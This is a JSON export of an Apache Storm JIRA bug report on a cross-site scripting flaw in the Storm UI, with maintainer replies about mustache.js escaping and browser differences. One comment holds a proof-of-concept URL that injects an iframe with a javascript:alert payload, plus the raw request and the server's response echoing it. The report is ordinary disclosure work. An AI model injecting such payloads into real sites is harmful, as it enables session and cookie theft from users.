{"expand":"renderedFields,names,schema,operations,editmeta,changelog,versionedRepresentations","id":"12727931","self":"https://issues.apache.org/jira/rest/api/2/issue/12727931","key":"STORM-408","fields":{"issuetype":{"self":"https://issues.apache.org/jira/rest/api/2/issuetype/1","id":"1","description":"A problem which impairs or prevents the functions of the product.","iconUrl":"https://issues.apache.org/jira/secure/viewavatar?size=xsmall&avatarId=21133&avatarType=issuetype","name":"Bug","subtask":false,"avatarId":21133},"timespent":null,"project":{"self":"https://issues.apache.org/jira/rest/api/2/project/12314820","id":"12314820","key":"STORM","name":"Apache Storm","avatarUrls":{"48x48":"https://issues.apache.org/jira/secure/projectavatar?pid=12314820&avatarId=21667","24x24":"https://issues.apache.org/jira/secure/projectavatar?size=small&pid=12314820&avatarId=21667","16x16":"https://issues.apache.org/jira/secure/projectavatar?size=xsmall&pid=12314820&avatarId=21667","32x32":"https://issues.apache.org/jira/secure/projectavatar?size=medium&pid=12314820&avatarId=21667"},"projectCategory":{"self":"https://issues.apache.org/jira/rest/api/2/projectCategory/13260","id":"13260","description":"Apache Storm Related","name":"Storm"}},"fixVersions":[{"self":"https://issues.apache.org/jira/rest/api/2/version/12326452","id":"12326452","name":"0.9.2-incubating","archived":false,"released":true,"releaseDate":"2014-06-25"}],"aggregatetimespent":null,"resolution":{"self":"https://issues.apache.org/jira/rest/api/2/resolution/1","id":"1","description":"A fix for this issue is checked into the tree and tested.","name":"Fixed"},"customfield_12312322":null,"customfield_12310220":"2014-07-17T15:02:12.912+0000","customfield_12312520":null,"customfield_12312323":null,"customfield_12312521":"Fri Aug 15 17:25:49 UTC 2014","customfield_12312320":null,"customfield_12310222":"1_*:*_1_*:*_68191483724_*|*_5_*:*_1_*:*_0","customfield_12310420":"406036","customfield_12312321":null,"resolutiondate":"2016-09-13T20:18:28.297+0000","workratio":-1,"customfield_12312328":null,"customfield_12312329":null,"customfield_12312923":null,"customfield_12312326":null,"customfield_12312920":null,"customfield_12310300":null,"customfield_12312327":null,"customfield_12312921":null,"customfield_12312324":null,"customfield_12312720":null,"customfield_12312325":null,"lastViewed":null,"watches":{"self":"https://issues.apache.org/jira/rest/api/2/issue/STORM-408/watchers","watchCount":5,"isWatching":false},"created":"2014-07-17T14:13:46.402+0000","priority":{"self":"https://issues.apache.org/jira/rest/api/2/priority/3","iconUrl":"https://issues.apache.org/jira/images/icons/priorities/major.svg","name":"Major","id":"3"},"labels":["security"],"customfield_12312333":null,"customfield_12312334":null,"customfield_12313422":"false","customfield_12310310":"0.0","customfield_12312331":null,"customfield_12312332":null,"timeestimate":null,"aggregatetimeoriginalestimate":null,"customfield_12311120":null,"customfield_12312330":null,"versions":[{"self":"https://issues.apache.org/jira/rest/api/2/version/12326789","id":"12326789","name":"0.9.0.1","archived":false,"released":true,"releaseDate":"2013-12-06"}],"customfield_12312339":null,"issuelinks":[],"assignee":null,"customfield_12312337":null,"customfield_12312338":null,"updated":"2016-09-13T20:18:29.867+0000","customfield_12312335":null,"customfield_12312336":null,"status":{"self":"https://issues.apache.org/jira/rest/api/2/status/5","description":"A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.","iconUrl":"https://issues.apache.org/jira/images/icons/statuses/resolved.png","name":"Resolved","id":"5","statusCategory":{"self":"https://issues.apache.org/jira/rest/api/2/statuscategory/3","id":3,"key":"done","colorName":"green","name":"Done"}},"components":[{"self":"https://issues.apache.org/jira/rest/api/2/component/12327950","id":"12327950","name":"storm-core","description":"Core storm daemons and APIs including trident"}],"timeoriginalestimate":null,"description":"There are Cross-Site Scripting security vulnerabilities in Apache Storm.\n\nThe risk is that it is possible to steal or manipulate customer session and cookies, which might be used to impersonate a legitimate user, allowing the hacker to view or alter user records, and to perform transactions as that user.\n\nThe reason is that sanitation of hazardous characters was not performed correctly on user input.\n","customfield_10010":null,"timetracking":{},"customfield_12312026":null,"customfield_12312023":null,"customfield_12312024":null,"attachment":[],"customfield_12312340":null,"aggregatetimeestimate":null,"customfield_12312341":null,"customfield_12312220":null,"customfield_12312022":null,"customfield_12310921":null,"customfield_12310920":"406056","customfield_12312823":null,"summary":"Cross-Site Scripting security vulnerability","creator":{"self":"https://issues.apache.org/jira/rest/api/2/user?username=akrishnan4doittnyc","name":"akrishnan4doittnyc","key":"akrishnan4doittnyc","avatarUrls":{"48x48":"https://issues.apache.org/jira/secure/useravatar?avatarId=10452","24x24":"https://issues.apache.org/jira/secure/useravatar?size=small&avatarId=10452","16x16":"https://issues.apache.org/jira/secure/useravatar?size=xsmall&avatarId=10452","32x32":"https://issues.apache.org/jira/secure/useravatar?size=medium&avatarId=10452"},"displayName":"Anand Krishnan","active":true,"timeZone":"America/New_York"},"subtasks":[],"reporter":{"self":"https://issues.apache.org/jira/rest/api/2/user?username=akrishnan4doittnyc","name":"akrishnan4doittnyc","key":"akrishnan4doittnyc","avatarUrls":{"48x48":"https://issues.apache.org/jira/secure/useravatar?avatarId=10452","24x24":"https://issues.apache.org/jira/secure/useravatar?size=small&avatarId=10452","16x16":"https://issues.apache.org/jira/secure/useravatar?size=xsmall&avatarId=10452","32x32":"https://issues.apache.org/jira/secure/useravatar?size=medium&avatarId=10452"},"displayName":"Anand Krishnan","active":true,"timeZone":"America/New_York"},"customfield_12310291":null,"customfield_12310290":null,"aggregateprogress":{"progress":0,"total":0},"environment":"Java","customfield_12313520":null,"customfield_12311020":null,"duedate":null,"customfield_12310250":null,"progress":{"progress":0,"total":0},"comment":{"comments":[{"self":"https://issues.apache.org/jira/rest/api/2/issue/12727931/comment/14064991","id":"14064991","author":{"self":"https://issues.apache.org/jira/rest/api/2/user?username=revans2","name":"revans2","key":"revans2","avatarUrls":{"48x48":"https://issues.apache.org/jira/secure/useravatar?avatarId=10452","24x24":"https://issues.apache.org/jira/secure/useravatar?size=small&avatarId=10452","16x16":"https://issues.apache.org/jira/secure/useravatar?size=xsmall&avatarId=10452","32x32":"https://issues.apache.org/jira/secure/useravatar?size=medium&avatarId=10452"},"displayName":"Robert Joseph Evans","active":true,"timeZone":"America/Chicago"},"body":"Could you give some more details on this?  If you don't feel comfortable disclosing details here please send those details to the PPMC private@storm.incubator.apache.org","updateAuthor":{"self":"https://issues.apache.org/jira/rest/api/2/user?username=revans2","name":"revans2","key":"revans2","avatarUrls":{"48x48":"https://issues.apache.org/jira/secure/useravatar?avatarId=10452","24x24":"https://issues.apache.org/jira/secure/useravatar?size=small&avatarId=10452","16x16":"https://issues.apache.org/jira/secure/useravatar?size=xsmall&avatarId=10452","32x32":"https://issues.apache.org/jira/secure/useravatar?size=medium&avatarId=10452"},"displayName":"Robert Joseph Evans","active":true,"timeZone":"America/Chicago"},"created":"2014-07-17T15:02:12.912+0000","updated":"2014-07-17T15:02:12.912+0000"},{"self":"https://issues.apache.org/jira/rest/api/2/issue/12727931/comment/14065533","id":"14065533","author":{"self":"https://issues.apache.org/jira/rest/api/2/user?username=akrishnan4doittnyc","name":"akrishnan4doittnyc","key":"akrishnan4doittnyc","avatarUrls":{"48x48":"https://issues.apache.org/jira/secure/useravatar?avatarId=10452","24x24":"https://issues.apache.org/jira/secure/useravatar?size=small&avatarId=10452","16x16":"https://issues.apache.org/jira/secure/useravatar?size=xsmall&avatarId=10452","32x32":"https://issues.apache.org/jira/secure/useravatar?size=medium&avatarId=10452"},"displayName":"Anand Krishnan","active":true,"timeZone":"America/New_York"},"body":"These Cross-site Scripting security vulnerabilities are manifest in the Storm UI specifically. They were discovered using a commercial security tool that injects various attack vectors into the HTTP request and analyzes the response.\n\nFor example, changing the following HTTP GET request URL: (*NOTE: actual server name was changed to _server_name_ )\n\n{{http://server_name:8080/topology/PROCESS_STATUS_TOPOLOGY-3-1402681332}}\n\nby changing the end of parameter: {{1402681332}} \nto: {{1402681332%3Ciframe%20src=javascript:alert(1342)%20}}\n\n{{http://server_name:8080/topology/PROCESS_STATUS_TOPOLOGY-3-1402681332%3Ciframe%20src=javascript:alert(1342)%20}}\n\n_Test HTTP Request and Response:_\n\n{code}\nGET /topology/PROCESS_STATUS_TOPOLOGY-3-1402681332%3Ciframe%20src=javascript:alert(1342)%20\nHTTP/1.1\nAccept: text/html, application/xhtml+xml, */*\nReferer: http://server_name:8080/topology/PROCESS_STATUS_TOPOLOGY-3-1402681332\nAccept-Language: en-US\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)\nConnection: Keep-Alive\nDNT: 1\nHost: server_name:8080\nCookie: sys=true\n{code}\n\n{code}\nHTTP/1.1 500 Internal Server Error\nDate: Wed, 18 Jun 2014 19:37:01 GMT\nContent-Type: text/html; charset=iso-8859-1\nContent-Length: 3183\nServer: Jetty(6.1.26)\n<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\">\n<html><head><title>Storm UI</title><link href=\"/css/bootstrap-1.1.0.css\" rel=\"stylesheet\"\ntype=\"text/css\"><link href=\"/css/style.css\" rel=\"stylesheet\" type=\"text/css\"><script\nsrc=\"/js/jquery-1.6.2.min.js\" type=\"text/javascript\"></script><script\nsrc=\"/js/jquery.tablesorter.min.js\" type=\"text/javascript\"></script><script\nsrc=\"/js/jquery.cookies.2.2.0.min.js\" type=\"text/javascript\"></script><script src=\"/js/script.js\"\ntype=\"text/javascript\"></script></head><body><h1><a href=\"/\">Storm UI</a></h1><h2>Internal Server\nError</h2><pre>NotAliveException(msg:PROCESS_STATUS_TOPOLOGY-3-1402681332<iframe\nsrc=javascript:alert(1342) )\nat backtype.storm.generated.Nimbus$getTopologyInfo_result.read(Nimbus.java:11330)\nat org.apache.thrift7.TServiceClient.receiveBase(TServiceClient.java:78)\nat backtype.storm.generated.Nimbus$Client.recv_getTopologyInfo(Nimbus.java:474)\nat backtype.storm.generated.Nimbus$Client.getTopologyInfo(Nimbus.java:461)\nat backtype.storm.ui.core$topology_page.invoke(core.clj:481)\nat backtype.storm.ui.core$fn__7877.invoke(core.clj:745)\nat compojure.core$make_route$fn__3855.invoke(core.clj:93)\nat compojure.core$if_route$fn__3843.invoke(core.clj:39)\nat compojure.core$if_method$fn__3836.invoke(core.clj:24)\nat compojure.core$routing$fn__3861.invoke(core.clj:106)\nat clojure.core$some.invoke(core.clj:2390)\nat compojure.core$routing.doInvoke(core.clj:106)\nat clojure.lang.RestFn.applyTo(RestFn.java:139)\nat clojure.core$apply.invoke(core.clj:603)\nat compojure.core$routes$fn__3865.invoke(core.clj:111)\nat ring.middleware.reload$wrap_reload$fn__7170.invoke(reload.clj:14)\nat backtype.storm.ui.core$catch_errors$fn__7912.invoke(core.clj:798)\nat\nring.middleware.keyword_params$wrap_keyword_params$fn__4391.invoke(keyword_params.clj:27)\nat ring.middleware.nested_params$wrap_nested_params$fn__4428.invoke(nested_params.clj:65)\nat ring.middleware.params$wrap_params$fn__4365.invoke(params.clj:55)\nat\nring.middleware.multipart_params$wrap_multipart_params$fn__4454.invoke(multipart_params.clj:103)\nat ring.middleware.flash$wrap_flash$fn__4729.invoke(flash.clj:14)\nat ring.middleware.session$wrap_session$fn__4720.invoke(session.clj:43)\nat ring.middleware.cookies$wrap_cookies$fn__4657.invoke(cookies.clj:160)\nat ring.adapter.jetty$proxy_handler$fn__4204.invoke(jetty.clj:16)\nat ring.adapter.jetty.proxy$org.mortbay.jetty.handler.AbstractHandler$0.handle(Unknown\nSource)\nat org.mortbay.jetty.handler.HandlerWrapper.handle(HandlerWrapper.java:152)\nat org.mortbay.jetty.Server.handle(Server.java:326)\nat org.mortbay.jetty.HttpConnection.handleRequest(HttpConnection.java:542)\nat\norg.mortbay.jetty.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:928)\nat org.mortbay.jetty.HttpParser.parseNext(HttpParser.java:549)\nat org.mortbay.jetty.HttpParser.parseAvailable(HttpParser.java:212)\nat org.mortbay.jetty.HttpConnection.handle(HttpConnection.java:404)\nat org.mortbay.jetty.bio.SocketConnector$Connection.run(SocketConnector.java:228)\nat org.mortbay.thread.QueuedThreadPool$PoolThread.run(QueuedThreadPool.java:582)\n</pre></body></html>\n{code}\n\nThe test result seems to indicate a vulnerability because the commercial security tool successfully embedded a script in the response, which will be executed when the page loads in the user's browser.\n\nLet me know if this is the type of detail you were interested in.\n\n","updateAuthor":{"self":"https://issues.apache.org/jira/rest/api/2/user?username=akrishnan4doittnyc","name":"akrishnan4doittnyc","key":"akrishnan4doittnyc","avatarUrls":{"48x48":"https://issues.apache.org/jira/secure/useravatar?avatarId=10452","24x24":"https://issues.apache.org/jira/secure/useravatar?size=small&avatarId=10452","16x16":"https://issues.apache.org/jira/secure/useravatar?size=xsmall&avatarId=10452","32x32":"https://issues.apache.org/jira/secure/useravatar?size=medium&avatarId=10452"},"displayName":"Anand Krishnan","active":true,"timeZone":"America/New_York"},"created":"2014-07-17T20:56:27.186+0000","updated":"2014-07-17T21:06:07.721+0000"},{"self":"https://issues.apache.org/jira/rest/api/2/issue/12727931/comment/14097614","id":"14097614","author":{"self":"https://issues.apache.org/jira/rest/api/2/user?username=parth.brahmbhatt","name":"parth.brahmbhatt","key":"parth.brahmbhatt","avatarUrls":{"48x48":"https://issues.apache.org/jira/secure/useravatar?avatarId=10452","24x24":"https://issues.apache.org/jira/secure/useravatar?size=small&avatarId=10452","16x16":"https://issues.apache.org/jira/secure/useravatar?size=xsmall&avatarId=10452","32x32":"https://issues.apache.org/jira/secure/useravatar?size=medium&avatarId=10452"},"displayName":"Parth Brahmbhatt","active":true,"timeZone":"America/Los_Angeles"},"body":"According to https://github.com/janl/mustache.js/ when we use {{ unsafe data }} the content is assumed to be unsafe and escaped by mustache. All storm mustache template uses {{ unsafe data }} so all the user entered content is treated as unsafe. I tried replicating your example and even though the script is rendered , the browser indeed does not run the alert as it is already escaped. If I change the template from unsafe {{ unsafe data }} to safe {{{ safe data }}} tag then the alert pops up. \n\nLet me know if you still think storm ui has this vulnerability. Otherwise , please confirm here that the vulnerability does not exist so someone can resolve this JIRA.","updateAuthor":{"self":"https://issues.apache.org/jira/rest/api/2/user?username=parth.brahmbhatt","name":"parth.brahmbhatt","key":"parth.brahmbhatt","avatarUrls":{"48x48":"https://issues.apache.org/jira/secure/useravatar?avatarId=10452","24x24":"https://issues.apache.org/jira/secure/useravatar?size=small&avatarId=10452","16x16":"https://issues.apache.org/jira/secure/useravatar?size=xsmall&avatarId=10452","32x32":"https://issues.apache.org/jira/secure/useravatar?size=medium&avatarId=10452"},"displayName":"Parth Brahmbhatt","active":true,"timeZone":"America/Los_Angeles"},"created":"2014-08-14T20:41:11.436+0000","updated":"2014-08-14T20:43:43.666+0000"},{"self":"https://issues.apache.org/jira/rest/api/2/issue/12727931/comment/14098663","id":"14098663","author":{"self":"https://issues.apache.org/jira/rest/api/2/user?username=akrishnan4doittnyc","name":"akrishnan4doittnyc","key":"akrishnan4doittnyc","avatarUrls":{"48x48":"https://issues.apache.org/jira/secure/useravatar?avatarId=10452","24x24":"https://issues.apache.org/jira/secure/useravatar?size=small&avatarId=10452","16x16":"https://issues.apache.org/jira/secure/useravatar?size=xsmall&avatarId=10452","32x32":"https://issues.apache.org/jira/secure/useravatar?size=medium&avatarId=10452"},"displayName":"Anand Krishnan","active":true,"timeZone":"America/New_York"},"body":"We are seeing the problem exists in the Firefox browser, but appears to be suppressed in the Chrome browser.\n\nAdditionally, we are currently using Storm version 0.9.0.1 which does not use the mustache.js templates. We will explore upgrading to solve this problem. Thanks.","updateAuthor":{"self":"https://issues.apache.org/jira/rest/api/2/user?username=akrishnan4doittnyc","name":"akrishnan4doittnyc","key":"akrishnan4doittnyc","avatarUrls":{"48x48":"https://issues.apache.org/jira/secure/useravatar?avatarId=10452","24x24":"https://issues.apache.org/jira/secure/useravatar?size=small&avatarId=10452","16x16":"https://issues.apache.org/jira/secure/useravatar?size=xsmall&avatarId=10452","32x32":"https://issues.apache.org/jira/secure/useravatar?size=medium&avatarId=10452"},"displayName":"Anand Krishnan","active":true,"timeZone":"America/New_York"},"created":"2014-08-15T15:15:39.081+0000","updated":"2014-08-15T15:31:03.198+0000"},{"self":"https://issues.apache.org/jira/rest/api/2/issue/12727931/comment/14098786","id":"14098786","author":{"self":"https://issues.apache.org/jira/rest/api/2/user?username=parth.brahmbhatt","name":"parth.brahmbhatt","key":"parth.brahmbhatt","avatarUrls":{"48x48":"https://issues.apache.org/jira/secure/useravatar?avatarId=10452","24x24":"https://issues.apache.org/jira/secure/useravatar?size=small&avatarId=10452","16x16":"https://issues.apache.org/jira/secure/useravatar?size=xsmall&avatarId=10452","32x32":"https://issues.apache.org/jira/secure/useravatar?size=medium&avatarId=10452"},"displayName":"Parth Brahmbhatt","active":true,"timeZone":"America/Los_Angeles"},"body":"I tried the same thing in firefox 24.0 , same result. I think upgrading to the newest version should fix the issue for you. Not sure what's the policy on fixing bugs/security vulnerabilities on older versions. ","updateAuthor":{"self":"https://issues.apache.org/jira/rest/api/2/user?username=parth.brahmbhatt","name":"parth.brahmbhatt","key":"parth.brahmbhatt","avatarUrls":{"48x48":"https://issues.apache.org/jira/secure/useravatar?avatarId=10452","24x24":"https://issues.apache.org/jira/secure/useravatar?size=small&avatarId=10452","16x16":"https://issues.apache.org/jira/secure/useravatar?size=xsmall&avatarId=10452","32x32":"https://issues.apache.org/jira/secure/useravatar?size=medium&avatarId=10452"},"displayName":"Parth Brahmbhatt","active":true,"timeZone":"America/Los_Angeles"},"created":"2014-08-15T17:25:49.416+0000","updated":"2014-08-15T17:25:49.416+0000"}],"maxResults":5,"total":5,"startAt":0},"votes":{"self":"https://issues.apache.org/jira/rest/api/2/issue/STORM-408/votes","votes":0,"hasVoted":false},"worklog":{"startAt":0,"maxResults":20,"total":0,"worklogs":[]},"customfield_12311820":"0|i1xvg7:"}}